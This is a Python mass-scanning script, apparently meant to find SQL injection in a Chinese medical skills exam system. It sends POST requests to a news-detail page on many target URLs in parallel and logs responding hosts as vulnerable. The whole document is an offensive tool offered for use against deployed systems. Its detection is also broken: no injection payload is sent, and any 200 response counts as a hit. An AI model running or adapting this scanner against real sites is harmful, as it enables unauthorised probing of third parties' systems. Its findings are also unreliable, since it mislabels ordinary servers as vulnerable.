# 远秋医学技能考试系统SQL注入
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """    __   _______   ____  __
 \ \ / / _ \ \ / /\ \/ /
  \ V / | | \ V /  \  / 
   | || |_| || |   /  \ 
   |_| \__\_\|_|  /_/\_                    
                version:1.0.8 
                author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="YQYX")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    payload_url = '/NewsDetailPage.aspx?key=news&id=7'
    url = target+payload_url
    try:
        res = requests.post(url=url,timeout=5)
        if res.status_code == 200:
                print(f"[+该url存在漏洞{target}")
                with open('try.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
        else:
                print(f"该url不存在漏洞{target}")
                return False
    except Exception as e:
        print(f"该url连接存在问题{target}")
        return False

if __name__ == '__main__':
    main()
